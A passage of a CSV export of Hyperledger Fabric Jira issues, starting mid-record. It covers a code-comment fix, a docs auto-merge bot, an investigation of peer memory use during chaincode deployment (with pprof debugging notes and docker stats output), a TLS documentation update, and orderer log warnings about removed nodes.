A check for package ID updates should be added in the above validation logic.",,denyeart,tatsu-sato,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0188b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,tatsu-sato,wlahti,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Feb/20 2:37 AM;wlahti;[~tatsu-sato] submitted a PR for this here: [https://github.com/hyperledger/fabric/pull/560];;;","19/Mar/20 1:14 PM;denyeart;This PR was merged in master, not release-2.0, therefore I've updated FixVersion to be v2.1.0.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix comments on private implicit collection layout in `lifecycle.go`,FAB-17442,44137,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,25/Jan/20 5:33 AM,28/Jan/20 7:18 AM,28/Oct/23 3:09 AM,28/Jan/20 7:18 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,,,,,,"In `core/chaincode/lifecycle/ lifecycle.go`, private/org scope implcit collection layout is described as comments as follows:
{code:go}
// Private/Org Scope Implcit Collection layout looks like the following
// namespaces/metadata/<namespace>#<sequence_number> -> namespace metadata, including type
// namespaces/fields/<namespace>#<sequence_number>/<field>  -> field of namespace type
//
// namespaces/metadata/mycc#1:                   ""ChaincodeParameters""
// namespaces/fields/mycc#1/EndorsementInfo:     {Version: ""1.3"", EndorsementPlugin: ""builtin"", InitRequired: true}
// namespaces/fields/mycc#1/ValidationInfo:      {ValidationPlugin: ""builtin"", ValidationParameter: <application-policy>}
// namespaces/fields/mycc#1/Collections          {<collection info>}
// namespaces/metadata/mycc#2:                   ""ChaincodeParameters""
// namespaces/fields/mycc#2/EndorsementInfo:     {Version: ""1.4"", EndorsementPlugin: ""builtin"", InitRequired: true}
// namespaces/fields/mycc#2/ValidationInfo:      {ValidationPlugin: ""builtin"", ValidationParameter: <application-policy>}
// namespaces/fields/mycc#2/Collections          {<collection info>}
//
// chaincode-source/metadata/mycc#1              ""LocalPackage""
// chaincode-source/fields/mycc#1/Hash           ""hash1""
{code}
The information about chaincode source is different from the implementation.
 This incorrect information may confuse Fabric platform developers.

 

So, according to the current implementation, it should be modified as follows:
{code:go}
// chaincode-sources/metadata/mycc#1              "" ChaincodeLocalPackage ""
// chaincode-sources/fields/mycc#1/PackageID           ""hash1""
{code}",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0188j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement Bot to Support Doc Maintainence,FAB-17443,44138,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,25/Jan/20 6:21 AM,29/Jan/20 3:51 AM,28/Oct/23 3:09 AM,29/Jan/20 3:51 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"To allow for doc maintainers to merge code related to only updates made to the `/docs` directory, we should implement a bot that allows maintainers to add a label to initiate an automerge once all normal conditions have been met.

The bot should verify that the ONLY changes in the PR are in the `/docs` directory and not both `/docs` and somewhere else in the repo",,btl5037,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0188r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jan/20 3:51 AM;denyeart;https://github.com/hyperledger/fabric/pull/548;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
High memory use on peer while deploying node chaincode,FAB-17444,44139,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Invalid: Works as Expected,wenjian,denyeart,denyeart,25/Jan/20 11:12 PM,06/Apr/20 10:36 PM,28/Oct/23 3:09 AM,06/Apr/20 10:36 PM,v1.4.4,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,Peer memory spikes several hundred megabytes while deploying node chaincode on v1.4.x. Need to determine cause and any changes that may mitigate the memory usage.,,aishwaryarao08,btl5037,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Apr/20 11:10 AM;wenjian;profile_1_before_ccdeploy.png;https://jira.hyperledger.org/secure/attachment/18202/profile_1_before_ccdeploy.png","01/Apr/20 11:10 AM;wenjian;profile_2_rightafter_ccdeploy.png;https://jira.hyperledger.org/secure/attachment/18203/profile_2_rightafter_ccdeploy.png","01/Apr/20 11:10 AM;wenjian;profile_3_after_ccdeploy_gc.png;https://jira.hyperledger.org/secure/attachment/18204/profile_3_after_ccdeploy_gc.png",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwr6z:zz6xk",,,,Unset,Unset,v1.4.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),aishwaryarao08,btl5037,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Jan/20 9:59 AM;btl5037;Is this during the instantiation process you are referring to? The Node gRPC module has to be compiled from source during the `npm install` process, a quick test showed it increases my containers memory usage by 400MB during the gRPC compilation process. It's even more while running DinD.

This is a very common complaint on Kubernetes and often requires users to run the instantiation process twice or increase the resources on their DinD and Peer containers to protect against resource exhaustion, where it normally fails the first time, but since it doesn't need to start the module installation process from scratch the second time it generally succeeds.;;;","27/Jan/20 7:35 PM;denyeart;Yes, the memory goes up upon instantiation on v1.4, and upon install on v2.0 (since chaincode now builds at install time).  On v2.0 I've seen peer memory go up about 200MB upon node js chaincode install. So perhaps v2.0 is not quite as bad as v1.4?;;;","31/Jan/20 11:08 AM;btl5037;Comments from discussions over the last few days:

During the build process, there is a large memory cost to the peer while it holds the Docker build context in memory while its passed to Docker for image creation. In pre-2.0 releases there is no mitigation for this. Starting in 2.0 you can build chaincode images out of band and use the cc_launcher to launch the prebuilt image, or any of the infinite ways you can make use of external builders and launchers to run chaincode. While it would be nice to solve this problem, it only occurs during chaincode instantiation time and then the large resource consumption is freed.

The more interesting problem, and it wasn't on the radar when we were running tests, as we didn't start monitoring peer memory usage until we had already used the peer to instantiate chaincode, is that a peer uses ~50MB of memory prior to chaincode instantiation, while the chaincode build process uses ~600MB of peer memory during the process (for fabcar node chaincode), it never returns to its pre-build state and settles around ~300MB of memory and remains in that state forever. We should investigate what is holding the lock on that additional ~200MB of memory.

I added a pprof server to the peer code and am going to see if I can look at the memory profile to see if anything stands out during that process.;;;","13/Mar/20 4:24 AM;aishwaryarao08;Hi there , is there any update on this ? ;;;","25/Mar/20 3:39 AM;btl5037;We can't address the high usage during chaincode build. The memory is being consumed by the Docker build context, and the context is replicated several times. Mitigating it in 1.4 really doesn't make sense as its a major architectural change. In 2.0 you can easily mitigate the problem by making use of the external builders.

In regards to the Peer not returning all of the memory it consumed even after the chaincode build process, we should enable the peer profile server and use it to diagnose what process is retaining that memory: [https://github.com/hyperledger/fabric/blob/master/sampleconfig/core.yaml#L355-L359];;;","25/Mar/20 4:28 AM;denyeart;Wenjian is going to take the next step.

Wenjian, here's some notes I took the last time I used the peer's pprof to troubleshoot a memory issue...

To enable pprof, set environment variables on peer: `CORE_PEER_PROFILE_ENABLED=true CORE_PEER_PROFILE_LISTENADDRESS=0.0.0.0:6060`
To collect pprof heap snapshot: http://localhost:6060/debug/pprof/heap?debug=1
To collect pprof go routine snapshot: http://localhost:6060/debug/pprof/goroutine?debug=1

curl -m 30 -X GET http://localhost:6060/debug/pprof/heap?debug=1
curl -m 30 -X GET http://localhost:6060/debug/pprof/goroutine?debug=1

The heap and go routine snapshots can be compared before and after the reproduction.

To use a pprof file:
http://localhost:6060/debug/pprof/heap
go tool pprof -top <heapfile>

Good pprof articles: 
https://software.intel.com/en-us/blogs/2014/05/10/debugging-performance-issues-in-go-programs
https://jvns.ca/blog/2017/09/24/profiling-go-with-pprof/;;;","01/Apr/20 11:09 AM;wenjian;After investigation and checking memory heap profiles (fabric v2.1), I found that the peer already freed up most of the increased memory. See the attached images:
 * profile_1_before_ccdeploy.png: 22M, network started and a channel was created and joined
 * profile_2_rightafter_ccdeploy.png: 228M, right after fabcar deployment, significant memory increase was observed.
 * profile_3_after_ccdeploy_gc.png: 37M (unused memory were gc'ed). Additional 15M memory were related to leveldb usage.

*However, `docker stats` still shows big memory usage* for each peer container even after the peers have been idle.
{quote}CONTAINER ID  NAME                                 CPU % MEM USAGE / LIMIT   MEM %  NET I/O              BLOCK I/O           PIDS

49355d73c301 peer0.org1.example.com 1.23%   251.6MiB / 3.853GiB   6.38%   1.16MB / 1.12MB 11.1MB / 1.33MB  11
 bb092d833e5b peer1.org1.example.com 1.15%   249.4MiB / 3.853GiB   6.32%   1.11MB / 1.11MB 356kB / 1.33MB  11
 a879b2fdfa1b peer0.org2.example.com 1.07%   251.4MiB / 3.853GiB   6.37%   1.13MB / 1.16MB 3.39MB / 1.33MB  10
 dd4821b0a02a peer1.org2.example.com 1.17%   249.4MiB / 3.853GiB   6.32%   1.1MB / 1.04MB 22.3MB / 2.15MB  11
{quote}
Apparently there is a difference between `docker stats` and go pprof. The reason is that `docker stats` includes caches that is not released by the container, but the peer process (top) does not include caches. Restart the docker container will release caches. Still investigate if there is a command to release caches in a docker container. 

[https://stackoverflow.com/questions/49159036/docker-does-not-free-memory-after-creating-and-deleting-files-with-php]

[https://stackoverflow.com/questions/48686599/docker-containers-memory-consumption-never-decreases-or-does-it]

Note: above observation is consistent with my earlier test that started peer by its raw Peer binary without using docker container. In that test,  peer memory usage was dropped after cc deployment. The test demonstrated that peer didn't retain memory. It is docker container that retains memory in cache.

 ;;;","03/Apr/20 12:34 AM;wenjian;Update:

As mentioned in a previous comment, the most memory increase was caused by `GenerateDockerBuild` during chaincode deployment. After cc is deployed, peer has already released the related memory (see the attached pprof images). However,  `docker stats` still hows much high memory usage because it includes both peer process memory and the cache used by the docker container. How and when to release the container cache is out of peer's control. 

I checked `docker stats` again after the peers were idle more than a day, the memory usage was actually decreased on all peer containers, but not in a consistent way (e.g., peer0.org2 dropped by 130+MiB, but peer1.org2 dropped less than 33MiB)
{quote}CONTAINER ID  NAME                                 CPU %    MEM USAGE / LIMIT   MEM %       NET I/O              BLOCK I/O           PIDS

49355d73c301 peer0.org1.example.com 2.30%    173.7MiB / 3.853GiB 4.40%           568MB / 585MB 24MB / 1.33MB 12
bb092d833e5b peer1.org1.example.com 2.12%    187.4MiB / 3.853GiB 4.75%            566MB / 570MB 6.07MB / 1.33MB 12
a879b2fdfa1b peer0.org2.example.com 2.11%       117.1MiB / 3.853GiB 2.97%              566MB / 569MB 6.05MB / 1.33MB 12
dd4821b0a02a peer1.org2.example.com 2.05%    222MiB / 3.853GiB 5.63%               567MB / 564MB 26MB / 2.15MB 12
{quote};;;","03/Apr/20 12:56 AM;wenjian;Good pprof doc on heap dump and analysis: 

[https://www.freecodecamp.org/news/how-i-investigated-memory-leaks-in-go-using-pprof-on-a-large-codebase-4bec4325e192/]

How to enable pprof on peer and collect a heap dump or goroutines dump: refer to Dave's comment (https://jira.hyperledger.org/browse/FAB-17444?focusedCommentId=68552&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-68552) . You can collect heap dump files at different times, e.g., before and after chaincode deployment.

To analyze the heap dump,

1. run `go tool pprof heap.out` (if you have a heapdump file) or `go tool pprof http://localhost:6060/debug/pprof/heap?debug=1`, which will generate a heapdump gz file for you

2. now it enters the pprof interactive mode, type `help` to see all commands and options. Some helpful commands are:
 * top or topN: output top entries
 * png, gif, ...: there are multiple commands generating a graph view, very helpful to pinpoint where the memory is in use. You have to install Graphvi
 * list <regexp>: output annotated source for functions matching regexp (e.g., list goleveldb);;;","03/Apr/20 10:59 AM;btl5037;Looking at Wenjian's analysis, and reading the articles and doc Wenjian linked about Docker memory management, as well as some of my own research, I'd venture to say we can close this issue.

Wenjian's original test used the raw Peer binary on her local machine without Docker, and she was unable to replicate the problem. But while testing with Docker we note that the Peer's memory usage remains high, even after the chaincode build process ends, I think this shows that her research is correct, it's Docker's memory management system that is retaining the memory in cache, not the Peer process itself.

I would recommend closing this as, ""working as designed""

[~denyeart] [~wenjian];;;","03/Apr/20 9:40 PM;wenjian;[~btl5037] Agree to close this ticket as ""working as designed"";;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update chain code as a service document,FAB-17445,44140,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,binhn,binhn,binhn,26/Jan/20 7:18 AM,21/Mar/20 9:05 PM,28/Oct/23 3:09 AM,21/Mar/20 9:05 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"The TLS cert section of the configuration is outdated. We need to change the key_path, cert_path, root_cert_path to ""client_key"", ""client_cert"" and ""root_cert"" respectively. Also all should be PEM encoded strings.",,binhn,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-13582,,,No,,Unset,No,,,"1|i0188z:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),binhn,muralisr,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jan/20 7:20 AM;muralisr;[~binhn] forgot about that (nice catch).;;;","27/Jan/20 1:23 AM;binhn;https://github.com/hyperledger/fabric/pull/553;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderers trying to deliverBlocks to Orderers that are no longer part of the network,FAB-17446,44144,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Low,,,ahmedsajid,ahmedsajid,28/Jan/20 12:48 AM,08/Feb/20 4:07 AM,28/Oct/23 3:09 AM,,v1.4.4,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,"This is not a big issue but when Orderer(s) are kicked out of the network by removing them from channel config, the existing Orderers still try to communicate with them.

However the warning message disappears when the existing Orderers are restarted which points to the Orderer information being cached somewhere.

IPs 10.113.150.2, 10.113.150.4 and 10.113.150.5 are removed Orderers. Logs if from one of the Orderer that is still part of the network.
{code:java}
2020-01-27 08:43:17.680 UTC [common.deliver] deliverBlocks -> WARN edc [channel: mychannel3] Error sending to 10.113.150.5:56424: rpc error: code = Unavailable desc = transport is closing
2020-01-27 08:43:17.765 UTC [common.deliver] deliverBlocks -> WARN edd [channel: mychannel4] Error sending to 10.113.150.5:56444: rpc error: code = Unavailable desc = transport is closing
2020-01-27 08:48:17.728 UTC [common.deliver] deliverBlocks -> WARN ede [channel: mychannel3] Error sending to 10.113.150.5:57122: rpc error: code = Unavailable desc = transport is closing
2020-01-27 08:53:17.777 UTC [common.deliver] deliverBlocks -> WARN edf [channel: mychannel4] Error sending to 10.113.150.5:57838: rpc error: code = Unavailable desc = transport is closing
2020-01-27 08:58:17.644 UTC [common.deliver] deliverBlocks -> WARN ee0 [channel: mychannel2] Error sending to 10.113.150.5:58498: rpc error: code = Unavailable desc = transport is closing
2020-01-27 08:58:17.809 UTC [common.deliver] deliverBlocks -> WARN ee1 [channel: mychannel4] Error sending to 10.113.150.5:58532: rpc error: code = Unavailable desc = transport is closing
2020-01-27 09:23:17.607 UTC [common.deliver] deliverBlocks -> WARN ee2 [channel: mychannel2] Error sending to 10.113.150.5:33742: rpc error: code = Unavailable desc = transport is closing
2020-01-27 09:33:17.712 UTC [common.deliver] deliverBlocks -> WARN ee3 [channel: mychannel3] Error sending to 10.113.150.5:35152: rpc error: code = Unavailable desc = transport is closing
2020-01-27 09:33:17.794 UTC [common.deliver] deliverBlocks -> WARN ee4 [channel: mychannel4] Error sending to 10.113.150.5:35172: rpc error: code = Unavailable desc = transport is closing
2020-01-27 09:38:17.821 UTC [common.deliver] deliverBlocks -> WARN ee5 [channel: mychannel4] Error sending to 10.113.150.5:35870: rpc error: code = Unavailable desc = transport is closing
2020-01-27 09:48:17.838 UTC [common.deliver] deliverBlocks -> WARN ee6 [channel: mychannel4] Error sending to 10.113.150.5:37262: rpc error: code = Unavailable desc = transport is closing
2020-01-27 09:53:17.701 UTC [common.deliver] deliverBlocks -> WARN ee7 [channel: mychannel3] Error sending to 10.113.150.5:37940: rpc error: code = Unavailable desc = transport is closing
2020-01-27 09:58:17.873 UTC [common.deliver] deliverBlocks -> WARN ee8 [channel: mychannel3] Error sending to 10.113.150.5:38672: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:03:17.636 UTC [common.deliver] deliverBlocks -> WARN ee9 [channel: mychannel3] Error sending to 10.113.150.5:39312: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:03:17.718 UTC [common.deliver] deliverBlocks -> WARN eea [channel: mychannel4] Error sending to 10.113.150.5:39332: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:18:17.626 UTC [common.deliver] deliverBlocks -> WARN eeb [channel: mychannel2] Error sending to 10.113.150.5:41398: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:23:17.636 UTC [common.deliver] deliverBlocks -> WARN eec [channel: mychannel2] Error sending to 10.113.150.5:42094: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:28:17.891 UTC [common.deliver] deliverBlocks -> WARN eed [channel: mychannel3] Error sending to 10.113.150.5:42848: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:33:17.612 UTC [common.deliver] deliverBlocks -> WARN eee [channel: mychannel2] Error sending to 10.113.150.5:43490: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:43:17.706 UTC [common.deliver] deliverBlocks -> WARN eef [channel: mychannel3] Error sending to 10.113.150.5:44896: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:48:17.948 UTC [common.deliver] deliverBlocks -> WARN ef0 [channel: mychannel4] Error sending to 10.113.150.5:45648: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:53:17.733 UTC [common.deliver] deliverBlocks -> WARN ef1 [channel: mychannel3] Error sending to 10.113.150.5:46288: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:58:17.885 UTC [common.deliver] deliverBlocks -> WARN ef2 [channel: mychannel3] Error sending to 10.113.150.5:47020: rpc error: code = Unavailable desc = transport is closing
2020-01-27 10:58:17.969 UTC [common.deliver] deliverBlocks -> WARN ef3 [channel: mychannel4] Error sending to 10.113.150.5:47040: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:08:17.979 UTC [common.deliver] deliverBlocks -> WARN ef4 [channel: mychannel2] Error sending to 10.113.150.5:48432: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:13:17.915 UTC [common.deliver] deliverBlocks -> WARN ef5 [channel: mychannel2] Error sending to 10.113.150.5:49112: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:13:17.987 UTC [common.deliver] deliverBlocks -> WARN ef6 [channel: mychannel3] Error sending to 10.113.150.5:49126: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:18:17.716 UTC [common.deliver] deliverBlocks -> WARN ef7 [channel: mychannel2] Error sending to 10.113.150.5:49772: rpc error: code = Canceled desc = context canceled
2020-01-27 11:23:17.630 UTC [common.deliver] deliverBlocks -> WARN ef8 [channel: mychannel4] Error sending to 10.113.150.5:50448: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:33:17.618 UTC [common.deliver] deliverBlocks -> WARN ef9 [channel: mychannel2] Error sending to 10.113.150.5:51842: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:38:17.723 UTC [common.deliver] deliverBlocks -> WARN efa [channel: mychannel3] Error sending to 10.113.150.5:52552: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:43:17.719 UTC [common.deliver] deliverBlocks -> WARN efb [channel: mychannel3] Error sending to 10.113.150.5:53252: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:48:17.722 UTC [common.deliver] deliverBlocks -> WARN efc [channel: mychannel2] Error sending to 10.113.150.5:53948: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:48:17.793 UTC [common.deliver] deliverBlocks -> WARN efd [channel: mychannel3] Error sending to 10.113.150.5:53964: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:53:17.724 UTC [common.deliver] deliverBlocks -> WARN efe [channel: mychannel4] Error sending to 10.113.150.5:54642: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:53:17.974 UTC [common.deliver] deliverBlocks -> WARN eff [channel: mychannel2] Error sending to 10.113.150.5:54694: rpc error: code = Unavailable desc = transport is closing
2020-01-27 11:58:17.873 UTC [common.deliver] deliverBlocks -> WARN f00 [channel: mychannel4] Error sending to 10.113.150.5:55376: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:03:17.724 UTC [common.deliver] deliverBlocks -> WARN f01 [channel: mychannel4] Error sending to 10.113.150.5:56034: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:03:18.032 UTC [common.deliver] deliverBlocks -> WARN f02 [channel: mychannel2] Error sending to 10.113.150.5:56088: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:08:17.901 UTC [common.deliver] deliverBlocks -> WARN f03 [channel: mychannel3] Error sending to 10.113.150.5:56766: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:13:17.624 UTC [common.deliver] deliverBlocks -> WARN f04 [channel: mychannel4] Error sending to 10.113.150.5:57406: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:23:17.623 UTC [common.deliver] deliverBlocks -> WARN f05 [channel: mychannel4] Error sending to 10.113.150.5:58800: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:23:18.014 UTC [common.deliver] deliverBlocks -> WARN f06 [channel: mychannel3] Error sending to 10.113.150.5:58870: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:33:17.732 UTC [common.deliver] deliverBlocks -> WARN f07 [channel: mychannel3] Error sending to 10.113.150.5:60208: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:38:17.633 UTC [common.deliver] deliverBlocks -> WARN f08 [channel: mychannel2] Error sending to 10.113.150.5:60890: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:43:17.731 UTC [common.deliver] deliverBlocks -> WARN f09 [channel: mychannel3] Error sending to 10.113.150.5:33370: rpc error: code = Unavailable desc = transport is closing
2020-01-27 12:53:17.922 UTC [common.deliver] deliverBlocks -> WARN f0a [channel: mychannel3] Error sending to 10.113.150.5:34796: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:03:17.645 UTC [common.deliver] deliverBlocks -> WARN f0b [channel: mychannel3] Error sending to 10.113.150.5:36136: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:03:17.975 UTC [common.deliver] deliverBlocks -> WARN f0c [channel: mychannel2] Error sending to 10.113.150.5:36208: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:08:17.647 UTC [common.deliver] deliverBlocks -> WARN f0d [channel: mychannel3] Error sending to 10.113.150.5:36834: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:13:17.912 UTC [common.deliver] deliverBlocks -> WARN f0e [channel: mychannel2] Error sending to 10.113.150.5:37582: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:13:17.986 UTC [common.deliver] deliverBlocks -> WARN f0f [channel: mychannel3] Error sending to 10.113.150.5:37598: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:18:17.634 UTC [common.deliver] deliverBlocks -> WARN f10 [channel: mychannel3] Error sending to 10.113.150.5:38222: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:18:17.978 UTC [common.deliver] deliverBlocks -> WARN f11 [channel: mychannel2] Error sending to 10.113.150.5:38294: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:23:17.721 UTC [common.deliver] deliverBlocks -> WARN f12 [channel: mychannel3] Error sending to 10.113.150.5:38940: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:28:17.915 UTC [common.deliver] deliverBlocks -> WARN f13 [channel: mychannel3] Error sending to 10.113.150.5:39672: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:38:17.646 UTC [common.deliver] deliverBlocks -> WARN f14 [channel: mychannel3] Error sending to 10.113.150.5:41008: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:38:17.993 UTC [common.deliver] deliverBlocks -> WARN f15 [channel: mychannel2] Error sending to 10.113.150.5:41082: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:43:17.819 UTC [common.deliver] deliverBlocks -> WARN f16 [channel: mychannel3] Error sending to 10.113.150.5:41742: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:48:17.748 UTC [common.deliver] deliverBlocks -> WARN f17 [channel: mychannel3] Error sending to 10.113.150.5:42420: rpc error: code = Unavailable desc = transport is closing
2020-01-27 13:53:17.826 UTC [common.deliver] deliverBlocks -> WARN f18 [channel: mychannel4] Error sending to 10.113.150.5:43132: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:03:17.640 UTC [common.deliver] deliverBlocks -> WARN f19 [channel: mychannel3] Error sending to 10.113.150.5:44486: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:03:17.722 UTC [common.deliver] deliverBlocks -> WARN f1a [channel: mychannel4] Error sending to 10.113.150.5:44504: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:08:18.031 UTC [common.deliver] deliverBlocks -> WARN f1b [channel: mychannel2] Error sending to 10.113.150.5:45254: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:13:17.700 UTC [common.deliver] deliverBlocks -> WARN f1c [channel: mychannel3] Error sending to 10.113.150.5:45898: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:23:17.897 UTC [common.deliver] deliverBlocks -> WARN f1d [channel: mychannel3] Error sending to 10.113.150.5:47328: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:26:07.532 UTC [common.deliver] Handle -> WARN f1e Error reading from 10.113.150.0:39400: rpc error: code = Canceled desc = context canceled
2020-01-27 14:28:17.906 UTC [common.deliver] deliverBlocks -> WARN f1f [channel: mychannel3] Error sending to 10.113.150.5:48022: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:33:17.974 UTC [common.deliver] deliverBlocks -> WARN f20 [channel: mychannel4] Error sending to 10.113.150.5:48738: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:36:34.535 UTC [common.deliver] deliverBlocks -> WARN f21 [channel: mychannel1] Error sending to 10.113.150.1:45838: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:36:34.581 UTC [common.deliver] deliverBlocks -> WARN f22 [channel: mychannel1] Error sending to 10.113.150.1:45840: rpc error: code = Unavailable desc = transport is closing
2020-01-27 14:38:17.634 UTC [common.deliver] deliverBlocks -> WARN f23 [channel: mychannel3] Error sending to 10.113.150.5:49362: rpc error: code = Unavailable desc = transport is closing{code}",,ahmedsajid,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0189v:",,,,Unset,Unset,,"1) Bring up a network with 3 Orderers.
2) Run some transactions to the network.
3) Bring up 3 more Orderers and add them to System and Application channels.
4) Remove the 3 Old Orderers from all channels using config updates.
